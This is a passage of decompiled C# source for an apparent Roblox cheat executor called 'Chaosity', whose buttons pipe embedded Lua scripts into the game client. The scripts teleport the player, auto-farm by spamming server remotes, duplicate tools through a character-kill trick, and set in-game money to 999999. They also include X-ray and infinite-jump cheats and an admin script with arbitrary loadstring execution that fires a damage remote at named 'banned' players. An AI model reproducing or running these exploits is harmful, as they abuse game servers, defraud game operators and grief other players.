1)\nShop.TextScaled = true\nShop.TextSize = 14\nShop.TextWrapped = true\n\nShop.MouseButton1Click:connect(function()\ngame.Workspace[Name].HumanoidRootPart.CFrame = CFrame.new(-52.7326279, 3.45200205, -556.515015)\nend)\n\nSite.Name = 'Site'\nSite.Parent = BG\nSite.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)\nSite.BorderColor3 = Color3.new(0.176471, 0.176471, 0.176471)\nSite.Position = UDim2.new(0.0333333351, 0, 0.301724136, 0)\nSite.Size = UDim2.new(0, 107, 0, 22)\nSite.Font = Enum.Font.SourceSansBold\nSite.Text = '[10] Construction Site'\nSite.TextColor3 = Color3.new(1, 1, 1)\nSite.TextScaled = true\nSite.TextSize = 14\nSite.TextWrapped = true\n\nSite.MouseButton1Click:connect(function()\ngame.Workspace[Name].HumanoidRootPart.CFrame = CFrame.new(-89, 3, -452)\nend)\n\nAutoFarm.Name = 'AutoFarm'\nAutoFarm.Parent = BG\nAutoFarm.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)\nAutoFarm.BorderColor3 = Color3.new(0.176471, 0.176471, 0.176471)\nAutoFarm.Position = UDim2.new(0.566666663, 0, 0.303501934, 0)\nAutoFarm.Size = UDim2.new(0, 105, 0, 22)\nAutoFarm.Font = Enum.Font.SourceSansBold\nAutoFarm.Text = '[20] Semi Auto Farm'\nAutoFarm.TextColor3 = Color3.new(1, 1, 1)\nAutoFarm.TextScaled = true\nAutoFarm.TextSize = 14\nAutoFarm.TextWrapped = true\n\nAutoFarm.MouseButton1Click:connect(function()\nlocal plr = game.Players.LocalPlayer\nlocal c = plr.Character\nlocal remote = Game['ReplicatedStorage']['Remotes']['sellBricks']\n\nwhile true do\n    c = game.Players.LocalPlayer.Character\n    c:SetPrimaryPartCFrame(CFrame.new(71,5,60))\n    remote:FireServer()\n    wait(5)\n    c:SetPrimaryPartCFrame(CFrame.new(106,1.5,140))\n    remote:FireServer()\n    wait(5)\n    c:SetPrimaryPartCFrame(CFrame.new(106,21,175))\n    remote:FireServer()\n    wait(5)\n    c:SetPrimaryPartCFrame(CFrame.new(150,19,177))\n    remote:FireServer()\n    wait(5)\n    c:SetPrimaryPartCFrame(CFrame.new(145,7,122))\n    remote:FireServer()\n    wait(5)\n    c:SetPrimaryPartCFrame(CFrame.new(145,7,100))\n    remote:FireServer()\n    wait(5)\n    c:SetPrimaryPartCFrame(CFrame.new(145,7,190))\n    remote:FireServer()\n    wait(5)\n    c:SetPrimaryPartCFrame(CFrame.new(100,7,210))\n    remote:FireServer()\n    wait(5)\nend\nend)\n\nHome.Name = 'Home'\nHome.Parent = BG\nHome.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)\nHome.BorderColor3 = Color3.new(0.176471, 0.176471, 0.176471)\nHome.Position = UDim2.new(0.567841053, 0, 0.421485007, 0)\nHome.Size = UDim2.new(0, 107, 0, 22)\nHome.Font = Enum.Font.SourceSansBold\nHome.Text = '[15] Happy Home In Robloxia'\nHome.TextColor3 = Color3.new(1, 1, 1)\nHome.TextScaled = true\nHome.TextSize = 14\nHome.TextWrapped = true\n\nHome.MouseButton1Click:connect(function()\ngame.Workspace[Name].HumanoidRootPart.CFrame = CFrame.new(-88, 3.5, -150)\nend)\n\nShip.Name = 'Ship'\nShip.Parent = BG\nShip.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)\nShip.BorderColor3 = Color3.new(0.176471, 0.176471, 0.176471)\nShip.Position = UDim2.new(0.0333333351, 0, 0.536964953, 0)\nShip.Size = UDim2.new(0, 107, 0, 22)\nShip.Font = Enum.Font.SourceSansBold\nShip.Text = '[20] Ship & LightTower'\nShip.TextColor3 = Color3.new(1, 1, 1)\nShip.TextScaled = true\nShip.TextSize = 14\nShip.TextWrapped = true\n\nShip.MouseButton1Click:connect(function()\ngame.Workspace[Name].HumanoidRootPart.CFrame = CFrame.new(18.19, 3.35, 144)\nend)\n\nSpace.Name = 'Space'\nSpace.Parent = BG\nSpace.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)\nSpace.BorderColor3 = Color3.new(0.176471, 0.176471, 0.176471)\nSpace.Position = UDim2.new(0.567841053, 0, 0.538166225, 0)\nSpace.Size = UDim2.new(0, 107, 0, 22)\nSpace.Font = Enum.Font.SourceSansBold\nSpace.Text = '[25] Space Travel'\nSpace.TextColor3 = Color3.new(1, 1, 1)\nSpace.TextScaled = true\nSpace.TextSize = 14\nSpace.TextWrapped = true\n\nSpace.MouseButton1Click:connect(function()\ngame.Workspace[Name].HumanoidRootPart.CFrame = CFrame.new(-89.05, 3.35, 144)\nend)\n\nCamp.Name = 'Camp'\nCamp.Parent = BG\nCamp.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)\nCamp.BorderColor3 = Color3.new(0.176471, 0.176471, 0.176471)\nCamp.Position = UDim2.new(0.0345077515, 0, 0.658738494, 0)\nCamp.Size = UDim2.new(0, 107, 0, 22)\nCamp.Font = Enum.Font.SourceSansBold\nCamp.Text = '[30] Military Camp'\nCamp.TextColor3 = Color3.new(1, 1, 1)\nCamp.TextScaled = true\nCamp.TextSize = 14\nCamp.TextWrapped = true\n\nCamp.MouseButton1Click:connect(function()\ngame.Workspace[Name].HumanoidRootPart.CFrame = CFrame.new(17.74, 3.35, 453.33)\nend)\n\nPillar.Name = 'Pillar'\nPillar.Parent = BG\nPillar.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)\nPillar.BorderColor3 = Color3.new(0.176471, 0.176471, 0.176471)\nPillar.Position = UDim2.new(0.56413734, 0, 0.658738494, 0)\nPillar.Size = UDim2.new(0, 107, 0, 22)\nPillar.Font = Enum.Font.SourceSansBold\nPillar.Text = '[35] Pyramid & Pillars'\nPillar.TextColor3 = Color3.new(1, 1, 1)\nPillar.TextScaled = true\nPillar.TextSize = 14\nPillar.TextWrapped = true\n\nPillar.MouseButton1Click:connect(function()\ngame.Workspace[Name].HumanoidRootPart.CFrame = CFrame.new(-86.08, 3.35, 446.63)\nend)\n\nCastle.Name = 'Castle'\nCastle.Parent = BG\nCastle.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)\nCastle.BorderColor3 = Color3.new(0.176471, 0.176471, 0.176471)\nCastle.Position = UDim2.new(0.0345076919, 0, 0.798816323, 0)\nCastle.Size = UDim2.new(0, 107, 0, 22)\nCastle.Font = Enum.Font.SourceSansBold\nCastle.Text = '[40] Castle'\nCastle.TextColor3 = Color3.new(1, 1, 1)\nCastle.TextScaled = true\nCastle.TextSize = 14\nCastle.TextWrapped = true\n\nCastle.MouseButton1Click:connect(function()\ngame.Workspace[Name].HumanoidRootPart.CFrame = CFrame.new(18.35, 3.35, 774.2)\nend)\n\nEmpire.Name = 'Empire'\nEmpire.Parent = BG\nEmpire.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)\nEmpire.BorderColor3 = Color3.new(0.176471, 0.176471, 0.176471)\nEmpire.Position = UDim2.new(0.567841053, 0, 0.798816323, 0)\nEmpire.Size = UDim2.new(0, 107, 0, 22)\nEmpire.Font = Enum.Font.SourceSansBold\nEmpire.Text = '[45] Empire State & HQ'\nEmpire.TextColor3 = Color3.new(1, 1, 1)\nEmpire.TextScaled = true\nEmpire.TextSize = 14\nEmpire.TextWrapped = true\n\nEmpire.MouseButton1Click:connect(function()\ngame.Workspace[Name].HumanoidRootPart.CFrame = CFrame.new(-89.75, 3.35, 747.22)\nend)\n\nExit.Name = 'Exit'\nExit.Parent = BG\nExit.BackgroundColor3 = Color3.new(0.458824, 0.792157, 1)\nExit.BorderSizePixel = 0\nExit.Size = UDim2.new(0, 35, 0, 30)\nExit.Font = Enum.Font.SourceSansBold\nExit.Text = 'X'\nExit.TextColor3 = Color3.new(1, 1, 1)\nExit.TextScaled = true\nExit.TextSize = 14\nExit.TextWrapped = true\n\nExit.MouseButton1Click:connect(function()\nDestructionSim:Destroy()\nend)\n\n\nFarm.Name = 'Farm'\nFarm.Parent = BG\nFarm.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)\nFarm.BorderColor3 = Color3.new(0.176471, 0.176471, 0.176471)\nFarm.Position = UDim2.new(0.0345077515, 0, 0.421447635, 0)\nFarm.Size = UDim2.new(0, 107, 0, 22)\nFarm.Font = Enum.Font.SourceSansBold\nFarm.Text = '[10] Farm'\nFarm.TextColor3 = Color3.new(1, 1, 1)\nFarm.TextScaled = true\nFarm.TextSize = 14\nFarm.TextWrapped = true\n\nFarm.MouseButton1Click:connect(function()\ngame.Workspace[Name].HumanoidRootPart.CFrame = CFrame.new(16.23, 3.35, -152.98)\nend)");
    }

    private void flatButton254_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1, 5 do --Change the 5 to how many of your tool you want.\n\n    for _,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do\n    if (v:IsA('Tool')) then\n        v.Parent = game.Players.LocalPlayer\n    end\n    end\n\nwait(0.5) --Pause before SNAPPING the player's neck\n\n    game.Players.LocalPlayer.Character.Head.Neck:Destroy()\n\nwait(8) --Pause before repeating\nend\nwait(1) --Pause before giving the player his loot.\n\nfor _,v in pairs(game.Players.LocalPlayer:GetChildren()) do\n    if (v:IsA('Tool')) then\n    v.Parent = game.Players.LocalPlayer.Backpack\n    end\nend");
      NamedPipes.LuaPipe("for i = 1, 5 do --Change the 5 to how many of your tool you want.\n\n    for _,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do\n    if (v:IsA('Tool')) then\n        v.Parent = game.Players.LocalPlayer\n    end\n    end\n\nwait(0.5) --Pause before SNAPPING the player's neck\n\n    game.Players.LocalPlayer.Character.Head.Neck:Destroy()\n\nwait(8) --Pause before repeating\nend\nwait(1) --Pause before giving the player his loot.\n\nfor _,v in pairs(game.Players.LocalPlayer:GetChildren()) do\n    if (v:IsA('Tool')) then\n    v.Parent = game.Players.LocalPlayer.Backpack\n    end\nend");
    }

    private void flatButton255_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Workspace.Extinguisher.Extinguisher.ClickDetector.Detector:FireServer{}");
    }

    private void flatButton256_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local lplr = Game:GetService('Players').LocalPlayer\nfor i, c in pairs(workspace.Customers:GetChildren()) do\nlocal d = c.Head:FindFirstChild('Dialog')\nif d then\nlocal correct = d.Correct\nlocal head = c.Head\nworkspace.TutorialService.PlayerAction:FireServer('ClickedBubble', true)\nworkspace.Dialog:FireServer('ResponseSelected', correct, head)\nworkspace.GameService.OrderCompleted:FireServer(c, false)\nend\nend\nworkspace.Customers.ChildAdded:connect(function(c)\nlocal torso = c:WaitForChild('Torso')\nwhile wait() do\nif math.floor(torso.Position.Z) <= 104 then\nlocal d = c.Head:FindFirstChild('Dialog')\nif d then\nlocal correct = d.Correct\nlocal head = c.Head\nworkspace.TutorialService.PlayerAction:FireServer('ClickedBubble', true)\nworkspace.Dialog:FireServer('ResponseSelected', correct, head)\nworkspace.GameService.OrderCompleted:FireServer(c, false)\nbreak\nend\nend\nend\nend)");
    }

    private void flatButton257_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("-- Auto Supply\n-- Auto Supply\nlocal crates = workspace.AllSupplyBoxes\nlocal LocalPlayer = game.Players.LocalPlayer\nlocal DropOff = CFrame.new(43.5000114, 4.59913683, -9.79934692, 1, 0, 0, 0, 1, 0, 0, 0, 1)\nlocal event = workspace.GameService.UpdateObjectProperty\n\nfor i, c in pairs(crates:GetChildren()) do\nevent:FireServer(c, 'CFrame', DropOff)\nend\n\ncrates.ChildAdded:connect(function(c)\nevent:FireServer(c, 'CFrame', DropOff)\nend)");
    }

    private void flatButton258_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(23,5,6.5)");
    }

    private void flatButton259_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Workspace.Cars.Car.LeftDoor.ClickDetector.Detector:FireServer{}");
    }

    private void flatButton260_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("-- Instances:\nlocal V3RMDeanGo31 = Instance.new('ScreenGui')\nlocal Frame = Instance.new('Frame')\nlocal TextLabel = Instance.new('TextLabel')\nlocal TextLabel_2 = Instance.new('TextLabel')\nlocal OvenOpenClose = Instance.new('TextButton')\nlocal ChangeFace = Instance.new('TextButton')\nlocal ChangeJob = Instance.new('TextButton')\nlocal ResetHatsOutfit = Instance.new('TextButton')\nlocal ChangeClothes = Instance.new('TextButton')\nlocal TextBox = Instance.new('TextBox')\nlocal Close = Instance.new('TextButton')\n--Properties:\nV3RMDeanGo31.Name = 'V3RMDeanGo31'\nV3RMDeanGo31.Parent = game.Players.LocalPlayer:WaitForChild('PlayerGui')\n\nFrame.Parent = V3RMDeanGo31\nFrame.BackgroundColor3 = Color3.new(0.282353, 0, 1)\nFrame.BackgroundTransparency = 0.5\nFrame.BorderSizePixel = 2\nFrame.Position = UDim2.new(0.028963415, 0, 0.337349385, 0)\nFrame.Size = UDim2.new(0, 130, 0, 208)\n\nTextLabel.Parent = Frame\nTextLabel.BackgroundColor3 = Color3.new(1, 0, 0)\nTextLabel.BackgroundTransparency = 0.69999998807907\nTextLabel.Position = UDim2.new(0.00103189424, 0, 0.00277087092, 0)\nTextLabel.Size = UDim2.new(0, 130, 0, 32)\nTextLabel.Font = Enum.Font.SciFi\nTextLabel.Text = 'Work At A Pizza Place'\nTextLabel.TextColor3 = Color3.new(1, 1, 1)\nTextLabel.TextScaled = true\nTextLabel.TextSize = 14\nTextLabel.TextStrokeColor3 = Color3.new(1, 1, 1)\nTextLabel.TextWrapped = true\n\nTextLabel_2.Parent = Frame\nTextLabel_2.BackgroundColor3 = Color3.new(1, 0, 0)\nTextLabel_2.BackgroundTransparency = 0.69999998807907\nTextLabel_2.Position = UDim2.new(0.00103189424, 0, 0.823999882, 0)\nTextLabel_2.Size = UDim2.new(0, 130, 0, 32)\nTextLabel_2.Font = Enum.Font.SciFi\nTextLabel_2.Text = 'V3rm: DeanGo31'\nTextLabel_2.TextColor3 = Color3.new(1, 1, 1)\nTextLabel_2.TextScaled = true\nTextLabel_2.TextSize = 14\nTextLabel_2.TextStrokeColor3 = Color3.new(1, 1, 1)\nTextLabel_2.TextWrapped = true\n\nOvenOpenClose.Name = 'OvenOpenClose'\nOvenOpenClose.Parent = Frame\nOvenOpenClose.BackgroundColor3 = Color3.new(1, 0.0470588, 0.952941)\nOvenOpenClose.BackgroundTransparency = 1\nOvenOpenClose.Position = UDim2.new(0, 0, 0.600021482, 0)\nOvenOpenClose.Size = UDim2.new(0, 130, 0, 20)\nOvenOpenClose.Font = Enum.Font.Fantasy\nOvenOpenClose.Text = 'Loop Oven Open/Close'\nOvenOpenClose.TextColor3 = Color3.new(1, 0.878431, 0.431373)\nOvenOpenClose.TextScaled = true\nOvenOpenClose.TextSize = 20\nOvenOpenClose.TextWrapped = true\n\nChangeFace.Name = 'ChangeFace'\nChangeFace.Parent = Frame\nChangeFace.BackgroundColor3 = Color3.new(1, 0.0470588, 0.952941)\nChangeFace.BackgroundTransparency = 1\nChangeFace.Position = UDim2.new(0, 0, 0.21642673, 0)\nChangeFace.Size = UDim2.new(0, 130, 0, 20)\nChangeFace.Font = Enum.Font.Fantasy\nChangeFace.Text = 'Change Face'\nChangeFace.TextColor3 = Color3.new(1, 0.878431, 0.431373)\nChangeFace.TextScaled = true\nChangeFace.TextSize = 20\nChangeFace.TextWrapped = true\n\nChangeJob.Name = 'ChangeJob'\nChangeJob.Parent = Frame\nChangeJob.BackgroundColor3 = Color3.new(1, 0.0470588, 0.952941)\nChangeJob.BackgroundTransparency = 1\nChangeJob.Position = UDim2.new(0, 0, 0.314380109, 0)\nChangeJob.Size = UDim2.new(0, 130, 0, 20)\nChangeJob.Font = Enum.Font.Fantasy\nChangeJob.Text = 'Change Job'\nChangeJob.TextColor3 = Color3.new(1, 0.878431, 0.431373)\nChangeJob.TextScaled = true\nChangeJob.TextSize = 20\nChangeJob.TextWrapped = true\n\nResetHatsOutfit.Name = 'ResetHats/Outfit'\nResetHatsOutfit.Parent = Frame\nResetHatsOutfit.BackgroundColor3 = Color3.new(1, 0.0470588, 0.952941)\nResetHatsOutfit.BackgroundTransparency = 1\nResetHatsOutfit.Position = UDim2.new(0, 0, 0.406746924, 0)\nResetHatsOutfit.Size = UDim2.new(0, 130, 0, 20)\nResetHatsOutfit.Font = Enum.Font.Fantasy\nResetHatsOutfit.Text = 'Reset Hats/Outfit'\nResetHatsOutfit.TextColor3 = Color3.new(1, 0.878431, 0.431373)\nResetHatsOutfit.TextScaled = true\nResetHatsOutfit.TextSize = 20\nResetHatsOutfit.TextWrapped = true\n\nChangeClothes.Name = 'ChangeClothes'\nChangeClothes.Parent = Frame\nChangeClothes.BackgroundColor3 = Color3.new(1, 0.0470588, 0.952941)\nChangeClothes.BackgroundTransparency = 1\nChangeClothes.Position = UDim2.new(0, 0, 0.502900779, 0)\nChangeClothes.Size = UDim2.new(0, 130, 0, 20)\nChangeClothes.Font = Enum.Font.Fantasy\nChangeClothes.Text = 'Change Clothes'\nChangeClothes.TextColor3 = Color3.new(1, 0.878431, 0.431373)\nChangeClothes.TextScaled = true\nChangeClothes.TextSize = 20\nChangeClothes.TextWrapped = true\n\nTextBox.Parent = Frame\nTextBox.BackgroundColor3 = Color3.new(1, 1, 1)\nTextBox.BackgroundTransparency = 1\nTextBox.Position = UDim2.new(0, 0, 0.697115362, 0)\nTextBox.Size = UDim2.new(0, 130, 0, 19)\nTextBox.Font = Enum.Font.Code\nTextBox.Text = 'Asset Id:'\nTextBox.TextColor3 = Color3.new(1, 1, 1)\nTextBox.TextSize = 14\n\nClose.Name = 'Close'\nClose.Parent = Frame\nClose.BackgroundColor3 = Color3.new(1, 0.0470588, 0.952941)\nClose.BackgroundTransparency = 1\nClose.Position = UDim2.new(0.815384567, 0, 0.0625, 0)\nClose.Size = UDim2.new(0, 24, 0, 20)\nClose.Font = Enum.Font.Fantasy\nClose.Text = 'X'\nClose.TextColor3 = Color3.new(1, 0, 0)\nClose.TextScaled = true\nClose.TextSize = 20\nClose.TextWrapped = true\n-- Scripts:\nfunction SCRIPT_GGCV88_FAKESCRIPT() -- OvenOpenClose.LocalScript \n\tgetfenv().script = Instance.new('LocalScript', OvenOpenClose)\n\n\tscript.Parent.MouseButton1Click:connect(function()\t\n\t\tlocal OC = true\t\n\t\n\t\twhile OC == true do\n\t\t\twait(1)\n\t\t\tgame.Workspace.Ovens.Oven.Door.ClickDetector.Detector:FireServer()\n\t\tend\n\tend)\n\nend\ncoroutine.resume(coroutine.create(SCRIPT_GGCV88_FAKESCRIPT))\nfunction SCRIPT_MPNJ90_FAKESCRIPT() -- ChangeFace.LocalScript \n\tgetfenv().script = Instance.new('LocalScript', ChangeFace)\n\nscript.Parent.MouseButton1Click:connect(function()\n\tlocal ID = script.Parent.Parent.TextBox.Text\n\tlocal url = 'http://www.roblox.com/asset/?id='\n    game.Workspace.Main.ChangeFace:FireServer(game.Players.LocalPlayer.Character.Head.face, url.. ID)\n\n\nend)\n\nend\ncoroutine.resume(coroutine.create(SCRIPT_MPNJ90_FAKESCRIPT))\nfunction SCRIPT_RYXZ87_FAKESCRIPT() -- ChangeJob.LocalScript \n\tgetfenv().script = Instance.new('LocalScript', ChangeJob)\n\n\tscript.Parent.MouseButton1Click:connect(function()\n\t\tlocal Job = script.Parent.Parent.TextBox.Text\n\t\tgame.ReplicatedStorage.Channels.PlayerChannel:FireServer('ChangeJob', Job)\n\tend)\n\nend\ncoroutine.resume(coroutine.create(SCRIPT_RYXZ87_FAKESCRIPT))\nfunction SCRIPT_ICQC86_FAKESCRIPT() -- ResetHatsOutfit.LocalScript \n\tgetfenv().script = Instance.new('LocalScript', ResetHatsOutfit)\n\n\tscript.Parent.MouseButton1Click:connect(function()\n\t\tgame.ReplicatedStorage.Channels.PlayerChannel:FireServer('ResetAvatarAppearance', true)\n\tend)\n\nend\ncoroutine.resume(coroutine.create(SCRIPT_ICQC86_FAKESCRIPT))\nfunction SCRIPT_RVTQ87_FAKESCRIPT() -- ChangeClothes.LocalScript \n\tgetfenv().script = Instance.new('LocalScript', ChangeClothes)\n\n\tscript.Parent.MouseButton1Click:connect(function()\n\t\tlocal FId = script.Parent.Parent.TextBox.Text\n\t\tlocal RId = 'http://www.roblox.com/asset/?id=' and FId\n\t\tgame.ReplicatedStorage.Channels.PlayerChannel:FireServer('LoadAvatarAsset', FId)\n\tend)\n\t\n\nend\ncoroutine.resume(coroutine.create(SCRIPT_RVTQ87_FAKESCRIPT))\nfunction SCRIPT_KONE72_FAKESCRIPT() -- Close.LocalScript \n\tgetfenv().script = Instance.new('LocalScript', Close)\n\n\tscript.Parent.MouseButton1Click:connect(function()\t\n\t\tscript.Parent.Parent.Parent:Destroy()\n\tend)\n\nend\ncoroutine.resume(coroutine.create(SCRIPT_KONE72_FAKESCRIPT))");
    }

    private void flatButton261_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.ReplicatedStorage.PlayerMoney.UserNameHere.Value = 999999");
    }

    private void flatButton262_Click(object sender, EventArgs e)
    {
      this.formSkin1.FlatColor = System.Drawing.Color.OrangeRed;
      this.formSkin1.Refresh();
    }

    private void flatButton263_Click(object sender, EventArgs e)
    {
      this.formSkin1.HeaderColor = System.Drawing.Color.FromArgb((int) byte.MaxValue, 69, 0);
      this.formSkin1.Refresh();
      this.formSkin1.HeaderColor = System.Drawing.Color.FromArgb((int) byte.MaxValue, 69, 0);
      this.formSkin1.Refresh();
    }

    private void flatButton263_Click_1(object sender, EventArgs e)
    {
      this.formSkin1.HeaderColor = System.Drawing.Color.FromArgb((int) byte.MaxValue, 69, 0);
      this.formSkin1.Refresh();
    }

    private void flatButton269_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-962.95 192.78 -1939.59) + Vector3.new(1,0,0) end");
    }

    private void flatButton268_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1345.5061, 41.52003) + Vector3.new(1,0,0) end");
    }

    private void flatButton267_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1196.7594, 17.79999, -1745.2545) + Vector3.new(1,0,0) end");
    }

    private void flatButton266_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1473.59314, 18.0500565, -1757.59253) + Vector3.new(1,0,0) end");
    }

    private void flatButton265_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1147.04456, 17.8414955, -1651.50171) + Vector3.new(1,0,0) end");
    }

    private void flatButton264_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(673.29541, 17.7874451, 1425.93762) + Vector3.new(1,0,0) end");
    }

    private void flatButton270_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-975.22644, 31.597868, 1265.75757) + Vector3.new(1,0,0) end");
    }

    private void flatButton271_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1394.94434, 26.487484, 245.974197) + Vector3.new(1,0,0) end");
    }

    private void tabPage12_Click(object sender, EventArgs e)
    {
    }

    private void flatButton272_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("Click E to Toggle The X-Ray. FOR The X - Ray Will Show you true walls", "Chaosity");
      NamedPipes.LuaPipe("local Move = game.Workspace.Map local ReplicatedStorage = game:GetService('ReplicatedStorage') local Players = game:GetService('Players') local mouse = Players.LocalPlayer:GetMouse() local a = false mouse.KeyDown:Connect(function(key) if key == 'e' then if a == false then Move.Parent = ReplicatedStorage Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true a = true elseif a == true then Move.Parent = game.Workspace Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false a = false end end end)");
    }

    private void flatButton273_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local InfiniteJumpEnabled = true\ngame:GetService('UserInputService').JumpRequest:connect(function()\nif InfiniteJumpEnabled then\ngame:GetService'Players'.LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState('Jumping')\nend\nend)");
    }

    private void flatButton275_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local gPlayers = game:GetService('Players') \nlocal admin       = gPlayers.LocalPlayer.Name \nlocal bannedplyrs = {'PeopleYouHate','MorePeopleYouHate'}\n\nlocal admins = {'Friend, Friend'} -- names here of people who have access to your commands! (Future Feature?)\n\n-- declare services / init stuff --\n\nlocal services={}\nlocal cmds={}\nlocal std={}\n\nlocal serverLocked = false\n\nfunction FIX_LIGHTING()\ngame.Lighting.Ambient = Color3.new(0.5, 0.5, 0.5)\ngame.Lighting.Brightness = 1\ngame.Lighting.GlobalShadows = true\ngame.Lighting.Outlines = false\ngame.Lighting.TimeOfDay = 14\ngame.Lighting.FogEnd = 100000\nend\n\nservices.players=gPlayers\nservices.lighting=game:GetService('Lighting')\nservices.workspace=game:GetService('Workspace')\nservices.events = {}\nlocal user = gPlayers.LocalPlayer\n\nlocal cmdprefix    = ';'\nlocal scriptprefix = '/'\nlocal split        = ' '\n\n\nupdateevents=function()\nfor i,v in pairs(services.events) do services.events:remove(i) v:disconnect() end\nfor i,v in pairs(gPlayers:players())do\nlocal ev = v.Chatted:connect(function(msg) do_exec(msg,v) end)\nservices.events[#services.events+1] = ev\nend\nend\n\nstd.inTable=function(tbl,val)\nif tbl==nil then return false end\n\nfor _,v in pairs(tbl)do\nif v==val then return true end\nend \nreturn false\nend\n\nstd.out=function(str)\nprint(str)\nend\n\nstd.list=function(tbl) --turns table into list with commas\nlocal str=''\nfor i,v in pairs(tbl)do\nstr=str..tostring(v)\nif i~=#tbl then str=str..', ' end\nend \nreturn str\nend\n\nstd.endat=function(str,val)\nlocal z=str:find(val)\nif z then \nreturn str:sub(0,z-string.len(val)),true\nelse \nreturn str,false \nend\nend\n\nstd.first=function(str) return str:sub(1,1) end\n\nisAdmin=function(name)\nif name==admin then\nreturn true\nelseif admins[name]==true then\nreturn true\nend\nreturn false\nend\n\ngPlayers.PlayerAdded:connect(function(player)\nfor i,v in pairs(bannedplyrs) do\ngame.ReplicatedStorage.Event:FireServer('TPD', 2000, gPlayers[v].Character.Humanoid)\nend\nend)\n\nlocal exec=function(str)\nspawn(function()\nlocal script, loaderr = loadstring(str)\nif not script then\nerror(loaderr)\nelse\nscript()\nend\nend)\nend\n\nlocal findCmd=function(cmd_name)\nfor i,v in pairs(cmds)do\nif v.NAME:lower()==cmd_name:lower() or std.inTable(v.ALIAS,cmd_name:lower())then\nreturn v\nend\nend\nend\n\nlocal getCmd=function(msg)\nlocal cmd,hassplit=std.endat(msg:lower(),split)\nif hassplit then \nreturn {cmd,true} \nelse \nreturn {cmd,false}\nend\nend\n\nlocal getprfx=function(strn)\nif strn:sub(1,string.len(cmdprefix))==cmdprefix then return{'cmd',string.len(cmdprefix)+1}\nelseif strn:sub(1,string.len(scriptprefix))==scriptprefix then return{'exec',string.len(scriptprefix)+1}\nend return\nend\n\nlocal getArgs=function(str)\nlocal args={}\nlocal new_arg=nil\nlocal hassplit=nil\nlocal s=str\nrepeat\nnew_arg,hassplit=std.endat(s:lower(),split)\nif new_arg~='' then\nargs[#args+1]=new_arg\ns=s:sub(string.len(new_arg)+string.len(split)+1)\nend\nuntil hassplit==false\nreturn args\nend\n\nlocal function execCmd(str, plr)\nlocal s_cmd\nlocal a\nlocal cmd\ns_cmd = getCmd(str) --separate command from string using split {command name,arg bool (for arg system)}\ncmd = findCmd(s_cmd[1]) --get command object {NAME,DESC,{ALIASES},function(args)}\nif cmd == nil then return end\na = str:sub(string.len(s_cmd[1]) + string.len(split) + 1)--start string 'a' after command and split\nlocal args=getArgs(a)--gets us a nice table of arguments\n\npcall(function()\ncmd.FUNC(args, plr)\nend)\nend\n\nfunction do_exec(str,plr)\nif not isAdmin(plr.Name)then return end \n\nstr=str:gsub('/e ','')--remove '/e ' the easy way!\n\nlocal t=getprfx(str)\nif t==nil then return end\nstr=str:sub(t[2])\nif t[1]=='exec' then\nexec(str)\nelseif t[1]=='cmd' then\nexecCmd(str, plr)\nend\nend\n\nupdateevents()\n_G.exec_cmd = execCmd\n--game.Players.LocalPlayer.Chatted:connect(doexec)\n\nlocal _char=function(plr_name)\nfor i,v in pairs(game.Players:GetChildren())do\nif v:IsA'Player'then\nif v.Name==plr_name then return v.Character end\nend\nend\nreturn\nend\n\nlocal _plr=function(plr_name)\nfor i,v in pairs(game.Players:GetChildren())do\nif v:IsA'Player'then\nif v.Name==plr_name then return v end\nend\nend\nreturn\nend\n\nfunction addcmd(name,desc,alias,func)\ncmds[#cmds+1]=\n{\nNAME=name;\nDESC=desc;\nALIAS=alias;\nFUNC=func;\n}\nend\n\nlocal function getPlayer(name)\nlocal nameTable = 